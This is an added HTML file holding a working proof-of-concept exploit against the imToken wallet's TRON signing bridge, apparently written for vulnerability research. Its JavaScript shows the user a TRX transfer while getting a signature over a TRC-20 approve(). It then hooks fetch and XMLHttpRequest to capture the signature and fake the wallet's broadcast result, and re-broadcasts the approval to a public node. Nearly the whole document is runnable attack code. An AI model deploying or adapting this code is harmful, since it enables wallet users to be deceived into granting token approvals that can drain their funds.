@@ -1,0 +1,489 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TRON Mismatch PoC - Option A</title>
+    <style>
+      body { font-family: monospace; padding: 12px; font-size: 13px; background: #0d0d0d; color: #e0e0e0; }
+      h2 { color: #ff4444; margin: 0 0 4px; font-size: 15px; }
+      .note { color: #555; font-size: 11px; line-height: 1.5; margin-bottom: 12px; }
+      label { display: block; margin: 6px 0 2px; color: #aaa; font-size: 12px; }
+      input { width: 100%; box-sizing: border-box; background: #1a1a1a; border: 1px solid #333;
+              color: #e0e0e0; padding: 5px 7px; border-radius: 3px; font-family: monospace; font-size: 12px; }
+      button { margin-top: 10px; padding: 8px 18px; background: #c00; color: #fff;
+               border: none; border-radius: 3px; cursor: pointer; font-weight: bold; font-size: 13px; }
+      button:disabled { background: #555; cursor: not-allowed; }
+      .section { margin-top: 12px; }
+      .tag { color: #ff9900; font-weight: bold; font-size: 11px; text-transform: uppercase; margin-bottom: 3px; }
+      pre { background: #111; border: 1px solid #222; padding: 8px; border-radius: 4px;
+            overflow-x: auto; white-space: pre-wrap; word-break: break-all; min-height: 16px; font-size: 11.5px; }
+      .ok   { color: #44ff88; }
+      .err  { color: #ff4444; }
+      .warn { color: #ffaa00; }
+    </style>
+  </head>
+  <body>
+    <h2>TRON raw_data / raw_data_hex Mismatch PoC — Option A</h2>
+    <p class="note">
+      Vulnerability: <code>tron.sendTransaction</code> has no <code>validRawTx()</code> check.<br>
+      Preview renders from <code>raw_data</code> (TransferContract → shows as TRX transfer).<br>
+      SignAdaptor signs <code>raw_data_hex</code> (approve bytes) → signature is over approve txID.<br>
+      Option A: intercept the JS-layer broadcast, suppress it, re-send to api.trongrid.io directly.
+    </p>
+
+    <label>Preview recipient (TransferContract to_address — shown in wallet UI)</label>
+    <input id="previewRecipient" value="T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb" />
+    <label>Preview amount in SUN</label>
+    <input id="previewAmount" value="10000" />
+    <label>TRC-20 token contract (approve target)</label>
+    <input id="tokenContract" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
+    <label>Spender address (defaults to current account)</label>
+    <input id="spender" placeholder="defaults to current address" />
+    <label>Approve amount (token units)</label>
+    <input id="approveAmount" value="1" />
+    <label>RPC for building transactions</label>
+    <input id="rpcUrl" value="https://api.trongrid.io" />
+    <label>Direct broadcast endpoint (real TRON full node — bypasses token.im)</label>
+    <input id="broadcastUrl" value="https://api.trongrid.io/wallet/broadcasttransaction" />
+
+    <label id="ownerLabel" style="color:#ffaa00">
+      Signing wallet address (auto-detected — correct this if wrong)
+    </label>
+    <input id="ownerAddr" placeholder="detecting…" />
+    <div id="ownerHint" style="color:#555;font-size:11px;margin-top:2px"></div>
+
+    <button id="runBtn">Run PoC — invoke tron.sendTransaction with mismatched tx</button>
+
+    <div class="section"><div class="tag">Status</div><pre id="status"></pre></div>
+    <div class="section"><div class="tag">What user sees in wallet — raw_data (TransferContract)</div><pre id="previewOut"></pre></div>
+    <div class="section"><div class="tag">What is actually signed — raw_data_hex (approve)</div><pre id="approveOut"></pre></div>
+    <div class="section"><div class="tag">Intercepted signed tx</div><pre id="signedOut"></pre></div>
+    <div class="section"><div class="tag">Broadcast result — api.trongrid.io</div><pre id="broadcastOut"></pre></div>
+    <div class="section"><div class="tag">Intercept log</div><pre id="logOut"></pre></div>
+
+    <script>
+      const $ = (id) => document.getElementById(id);
+      const j = (v) => JSON.stringify(v, null, 2);
+      function setStatus(msg, cls) { $('status').textContent = msg; $('status').className = cls || ''; }
+
+      function rpc() {
+        return ($('rpcUrl').value.trim() || 'https://api.trongrid.io').replace(/\/$/, '');
+      }
+
+      function hexToBytes(hex) {
+        return Uint8Array.from((hex.match(/.{1,2}/g) || []).map(b => parseInt(b, 16)));
+      }
+
+      async function sha256Hex(hex) {
+        const digest = await crypto.subtle.digest('SHA-256', hexToBytes(hex));
+        return Array.from(new Uint8Array(digest))
+          .map(b => b.toString(16).padStart(2, '0'))
+          .join('');
+      }
+
+      async function recoverSigner(tx) {
+        try {
+          if (typeof window.tronWeb?.trx?.ecRecover !== 'function')
+            return 'tronWeb.trx.ecRecover unavailable';
+          return await window.tronWeb.trx.ecRecover(tx);
+        } catch (e) {
+          return 'ecRecover error: ' + (e.message || String(e));
+        }
+      }
+
+      function isTronAddr(a) { return typeof a === 'string' && a.startsWith('T') && a.length === 34; }
+
+      // Try multiple sources to find the wallet address imToken will actually sign with.
+      // Priority: sessionStorage cache > imToken bridge > tronLink > tronWeb.defaultAddress
+      async function detectSigningAddress() {
+        const sources = [];
+
+        // 1. Cached from previous SIGERROR discovery
+        const cached = sessionStorage.getItem('imtoken_signer');
+        if (isTronAddr(cached)) { sources.push({ src: 'sessionStorage cache', addr: cached }); }
+
+        // 2. imToken bridge methods
+        const bridgeCalls = [
+          ['tron.getAccounts',        r => Array.isArray(r) ? r[0] : null],
+          ['tron.accounts',           r => Array.isArray(r) ? r[0] : null],
+          ['tron.getSelectedAccount', r => r?.address ?? (typeof r === 'string' ? r : null)],
+          ['tron.getAddress',         r => typeof r === 'string' ? r : r?.address],
+        ];
+        for (const [method, extract] of bridgeCalls) {
+          try {
+            const raw  = await window.imToken?.callPromisifyAPI(method, {});
+            const addr = extract(raw);
+            if (isTronAddr(addr)) { sources.push({ src: method, addr }); break; }
+          } catch (_) {}
+        }
+
+        // 3. tronLink
+        const tl = window.tronLink?.address ?? window.tronLink?.tronWeb?.defaultAddress?.base58;
+        if (isTronAddr(tl)) sources.push({ src: 'tronLink.address', addr: tl });
+
+        // 4. tronWeb.defaultAddress (may be stale after wallet switch)
+        const tw = window.tronWeb?.defaultAddress?.base58;
+        if (isTronAddr(tw)) sources.push({ src: 'tronWeb.defaultAddress', addr: tw });
+
+        return sources;
+      }
+
+      function getOwnerAddress() {
+        const v = $('ownerAddr').value.trim();
+        if (!isTronAddr(v)) throw new Error('Signing wallet address is missing or invalid. Auto-detection may still be running.');
+        return v;
+      }
+
+      async function apiPost(url, body, fetchFn) {
+        const fn = fetchFn || window.fetch.bind(window);
+        const r = await fn(url, {
+          method: 'POST',
+          headers: { 'content-type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        if (!r.ok) { const t = await r.text().catch(() => ''); throw new Error(`HTTP ${r.status}: ${t}`); }
+        return r.json();
+      }
+
+      async function buildPreviewTransfer(from) {
+        const tx = await apiPost(`${rpc()}/wallet/createtransaction`, {
+          owner_address: from,
+          to_address: $('previewRecipient').value.trim(),
+          amount: Number($('previewAmount').value.trim()),
+          visible: true,
+        });
+        if (tx.Error) throw new Error('createtransaction: ' + tx.Error);
+        return tx;
+      }
+
+      async function buildApprove(from, spender) {
+        const spenderHex = window.tronWeb.address.toHex(spender).replace(/^41/, '').padStart(64, '0');
+        const amountHex  = BigInt($('approveAmount').value.trim() || '1').toString(16).padStart(64, '0');
+        const res = await apiPost(`${rpc()}/wallet/triggersmartcontract`, {
+          owner_address: from,
+          contract_address: $('tokenContract').value.trim(),
+          function_selector: 'approve(address,uint256)',
+          parameter: spenderHex + amountHex,
+          fee_limit: 100000000,
+          call_value: 0,
+          visible: true,
+        });
+        if (!res?.result?.result || !res?.transaction?.raw_data_hex)
+          throw new Error('triggersmartcontract failed: ' + j(res));
+        return res.transaction;
+      }
+
+      // ── Intercept fetch + XHR; capture imToken's signature; suppress original broadcast ──
+      //
+      // imToken signs raw_data_hex (the approve bytes), so the signature is valid over the
+      // APPROVE txID = SHA256(raw_data_hex) and ecrecovers to the real owner.
+      // BUT every broadcast endpoint (token.im AND trongrid) recomputes txID from the
+      // raw_data JSON (TransferContract), not from raw_data_hex. So broadcasting the
+      // captured (mismatched) body makes the node verify the approve-signature against the
+      // transfer txID → ecrecover yields a garbage address → SIGERROR.
+      // Fix: capture only the signature here; the caller re-attaches it to the pure approve
+      // transaction body (raw_data = approve) before broadcasting. See attempt().
+      async function interceptSignAndCapture(account, mismatchedTx) {
+        const nativeFetch = window.fetch.bind(window);
+        const NativeXHR   = window.XMLHttpRequest;
+        const log         = [];
+        let captured      = null;
+        let callError     = null;
+
+        const isBroadcast = (u) => /broadcasttransaction/i.test(String(u ?? ''));
+
+        const fakeSuccess = (body) =>
+          new Response(JSON.stringify({ result: true, txid: body.txID }),
+            { status: 200, headers: { 'content-type': 'application/json' } });
+
+        // fetch hook — capture and suppress
+        window.fetch = async function(input, init = {}) {
+          const url = typeof input === 'string' ? input : (input?.url ?? String(input));
+          log.push('[fetch] ' + url);
+          if (isBroadcast(url)) {
+            try {
+              const body = JSON.parse(typeof init?.body === 'string' ? init.body : '{}');
+              if (body?.signature?.length) {
+                captured = body;
+                log.push('[fetch] ✓ signed tx captured — suppressing token.im broadcast');
+                return fakeSuccess(body);
+              }
+            } catch (_) {}
+          }
+          return nativeFetch(input, init);
+        };
+
+        // XHR hook — capture and suppress
+        window.XMLHttpRequest = function InterceptedXHR() {
+          const xhr  = new NativeXHR();
+          let _url   = '';
+          const _open = NativeXHR.prototype.open.bind(xhr);
+          const _send = NativeXHR.prototype.send.bind(xhr);
+
+          xhr.open = function(m, u, ...rest) {
+            _url = u;
+            log.push('[xhr] ' + u);
+            return _open(m, u, ...rest);
+          };
+
+          xhr.send = function(body) {
+            if (isBroadcast(_url)) {
+              try {
+                const parsed = JSON.parse(typeof body === 'string' ? body : '{}');
+                if (parsed?.signature?.length) {
+                  captured = parsed;
+                  log.push('[xhr] ✓ signed tx captured — suppressing token.im broadcast');
+                  const fake = JSON.stringify({ result: true, txid: parsed.txID });
+                  Object.defineProperty(xhr, 'readyState',   { get: () => 4 });
+                  Object.defineProperty(xhr, 'status',       { get: () => 200 });
+                  Object.defineProperty(xhr, 'responseText', { get: () => fake });
+                  Object.defineProperty(xhr, 'response',     { get: () => fake });
+                  setTimeout(() => {
+                    xhr.onreadystatechange?.();
+                    xhr.onload?.(new Event('load'));
+                    xhr.dispatchEvent(new Event('load'));
+                    xhr.dispatchEvent(new Event('loadend'));
+                  }, 0);
+                  return;
+                }
+              } catch (_) {}
+            }
+            return _send(body);
+          };
+          return xhr;
+        };
+        window.XMLHttpRequest.prototype = NativeXHR.prototype;
+
+        try {
+          if (typeof window.imToken?.callPromisifyAPI !== 'function')
+            throw new Error('window.imToken.callPromisifyAPI not available. Must run inside imToken.');
+
+          await window.imToken.callPromisifyAPI('tron.sendTransaction', {
+            from: account,
+            tx: mismatchedTx,
+            useTronHeader: true,
+          });
+        } catch (e) {
+          callError = e;
+          log.push('[imToken] tron.sendTransaction error: ' + (e.message || String(e)));
+        } finally {
+          window.fetch          = nativeFetch;
+          window.XMLHttpRequest = NativeXHR;
+        }
+
+        if (!captured) {
+          return { captured: null, log, nativeFetch,
+            error: 'Signed tx NOT captured via JS fetch/XHR.\n' +
+                   'imToken broadcast natively (iOS NSURLSession) — JS hooks cannot intercept.\n\n' +
+                   (callError ? 'Native/imToken error:\n' + (callError.message || String(callError)) + '\n\n' : '') +
+                   'Options:\n' +
+                   '  1. Set up a system-level MITM proxy on the iOS device.\n' +
+                   '  2. Capture the broadcasttransaction POST body from the proxy.\n' +
+                   '  3. Replay that body to api.trongrid.io manually.' };
+        }
+
+        return { captured, log, nativeFetch, callError };
+      }
+
+      // Build the mismatched tx, get imToken's signature, then broadcast the PURE APPROVE
+      // body (raw_data = approve) carrying that signature. This makes the node compute
+      // txID = SHA256(approve raw_data) = approve txID, and ecrecover(sig, approve txID) =
+      // owner ✓ → approve() executes on-chain.
+      async function attempt(owner, spender, broadcastUrl) {
+        setStatus(`building transactions for owner: ${owner}…`);
+
+        const previewTransfer = await buildPreviewTransfer(owner);
+        const approveTx       = await buildApprove(owner, spender);
+
+        $('previewOut').textContent = j(previewTransfer.raw_data);
+
+        const approveData = approveTx.raw_data.contract[0].parameter.value.data ?? '';
+        if (approveData.slice(0, 8).toLowerCase() !== '095ea7b3')
+          throw new Error('Unexpected approve selector: ' + approveData.slice(0, 8));
+
+        $('approveOut').textContent = j({
+          owner,
+          txID:         approveTx.txID,
+          selector:     approveData.slice(0, 8) + '  (approve)',
+          approve_data: approveData,
+          raw_data_hex: approveTx.raw_data_hex,
+        });
+
+        // What imToken sees/signs: raw_data = transfer (UI), raw_data_hex = approve (signed).
+        const mismatchedTx = {
+          ...approveTx,
+          raw_data:     previewTransfer.raw_data,   // TransferContract shown to user
+          raw_data_hex: approveTx.raw_data_hex,     // approve bytes → what gets signed
+          txID:         approveTx.txID,             // SHA256(approve bytes)
+        };
+
+        setStatus('calling tron.sendTransaction — confirm in wallet…');
+        const { captured, log, nativeFetch, callError } =
+          await interceptSignAndCapture(owner, mismatchedTx);
+
+        if (!captured?.signature?.length) {
+          $('signedOut').textContent = j({
+            error: 'No signed transaction captured in JS.',
+            imToken_error: callError ? (callError.message || String(callError)) : null,
+            expected_approve_txID: approveTx.txID,
+            expected_approve_raw_data_hex_sha256: await sha256Hex(approveTx.raw_data_hex),
+          });
+          return { captured: null, log,
+                   error: 'No signature captured (imToken broadcast natively via NSURLSession; ' +
+                          'JS fetch/XHR hooks could not intercept).' };
+        }
+
+        const approveBroadcastBody = {
+          visible:      true,
+          txID:         approveTx.txID,
+          raw_data:     approveTx.raw_data,
+          raw_data_hex: approveTx.raw_data_hex,
+          signature:    captured.signature,
+        };
+
+        const diagnostics = {
+          owner,
+          approve_txID: approveTx.txID,
+          imToken_error_after_capture: callError ? (callError.message || String(callError)) : null,
+          approve_sha256_raw_data_hex: await sha256Hex(approveTx.raw_data_hex),
+          recover_signature_on_approve_body:
+            await recoverSigner(approveBroadcastBody),
+          recover_signature_on_captured_body:
+            await recoverSigner(captured),
+          captured_txID: captured.txID,
+          captured_sha256_raw_data_hex: captured.raw_data_hex
+            ? await sha256Hex(captured.raw_data_hex)
+            : null,
+          captured_matches_approve_txID: captured.txID === approveTx.txID,
+          captured_matches_approve_raw_data_hex:
+            captured.raw_data_hex === approveTx.raw_data_hex,
+          captured_raw_contract_type:
+            captured.raw_data?.contract?.[0]?.type ?? null,
+        };
+
+        if (!diagnostics.captured_matches_approve_txID ||
+            !diagnostics.captured_matches_approve_raw_data_hex ||
+            diagnostics.recover_signature_on_approve_body !== owner) {
+          $('signedOut').textContent = j({
+            error: 'Captured signature is not valid for the approve body. Broadcasting would SIGERROR.',
+            diagnostics,
+            captured_signature: captured.signature,
+          });
+          return {
+            captured,
+            log,
+            diagnostics,
+            error:
+              'Captured signature is not for this approveTx.\n' +
+              'This means imToken rewrote/rebuilt the transaction before signing, or the hook captured a different signed body.\n' +
+              'See "Intercepted signed tx" diagnostics and compare captured_* with approve_*.',
+          };
+        }
+
+        // Re-attach imToken's signature to the PURE APPROVE tx and broadcast that body.
+        // approveTx.raw_data / raw_data_hex / txID all describe the approve consistently,
+        // so the node's recomputed txID matches what imToken actually signed.
+        const broadcastBody = approveBroadcastBody;
+
+        $('signedOut').textContent = j({
+          note:        'signature captured from imToken, re-attached to APPROVE body',
+          diagnostics,
+          approveTxID: approveTx.txID,
+          signature:   captured.signature,
+        });
+
+        setStatus('broadcasting approve body to direct node…');
+        let broadcastResult;
+        try {
+          broadcastResult = await apiPost(broadcastUrl, broadcastBody, nativeFetch);
+        } catch (e) {
+          broadcastResult = {
+            error: 'direct broadcast threw',
+            message: e.message || String(e),
+          };
+        }
+        return { captured, log, broadcastResult, broadcastBody };
+      }
+
+      async function run() {
+        $('runBtn').disabled = true;
+        ['previewOut','approveOut','signedOut','broadcastOut','logOut']
+          .forEach(id => $(id).textContent = '');
+
+        try {
+          const account      = getOwnerAddress();
+          const spender      = $('spender').value.trim() || account;
+          const broadcastUrl = $('broadcastUrl').value.trim();
+
+          const { log, broadcastResult, broadcastBody, error } =
+            await attempt(account, spender, broadcastUrl);
+
+          $('logOut').textContent = (log || []).join('\n');
+
+          if (error) { setStatus(error, 'err'); return; }
+
+          $('broadcastOut').textContent = j(broadcastResult);
+
+          if (broadcastResult?.result === true) {
+            setStatus(
+              [
+                '✓ SUCCESS — approve() confirmed and executed.',
+                '',
+                'Wallet showed user:  TransferContract ("sending TRX") — no approve warning',
+                'SignAdaptor signed:  approve() hash via raw_data_hex',
+                'Executed on-chain:   approve(' + spender + ', ' + $('approveAmount').value.trim() + ')',
+                'Token contract:      ' + $('tokenContract').value.trim(),
+                'approve txID:        ' + (broadcastBody?.txID ?? broadcastResult?.txid ?? ''),
+                '',
+                'Vulnerability confirmed: sendTransaction has no validRawTx() check.',
+              ].join('\n'),
+              'ok'
+            );
+          } else {
+            setStatus('Broadcast result:\n' + j(broadcastResult), 'err');
+          }
+
+        } catch (e) {
+          console.error(e);
+          setStatus('Error: ' + (e.message || String(e)), 'err');
+        } finally {
+          $('runBtn').disabled = false;
+        }
+      }
+
+      // ── Auto-detect signing address on page load ────────────────────────────
+      (async () => {
+        try {
+          const sources = await detectSigningAddress();
+          if (sources.length === 0) {
+            $('ownerAddr').placeholder = 'not detected — enter manually';
+            $('ownerHint').textContent = 'Could not detect address. Enter your TRON wallet address manually.';
+            return;
+          }
+
+          // Use the highest-priority source (first in list)
+          const best = sources[0];
+          $('ownerAddr').value = best.addr;
+
+          // Show all detected sources for transparency
+          const allSrcs = sources.map(s => `${s.src}: ${s.addr}`).join('\n');
+          $('ownerHint').textContent = `Source: ${best.src}` +
+            (sources.length > 1 ? `\nAll sources:\n${allSrcs}` : '');
+
+          // Warn if sources disagree (possible stale tronWeb.defaultAddress)
+          const unique = [...new Set(sources.map(s => s.addr))];
+          if (unique.length > 1) {
+            $('ownerHint').textContent +=
+              '\n⚠ Sources disagree — verify the correct address above before running.';
+            $('ownerLabel').style.color = '#ff4444';
+          }
+        } catch (e) {
+          $('ownerHint').textContent = 'Detection error: ' + e.message;
+        }
+      })();
+
+      $('runBtn').addEventListener('click', run);
+    </script>
+  </body>
+</html>
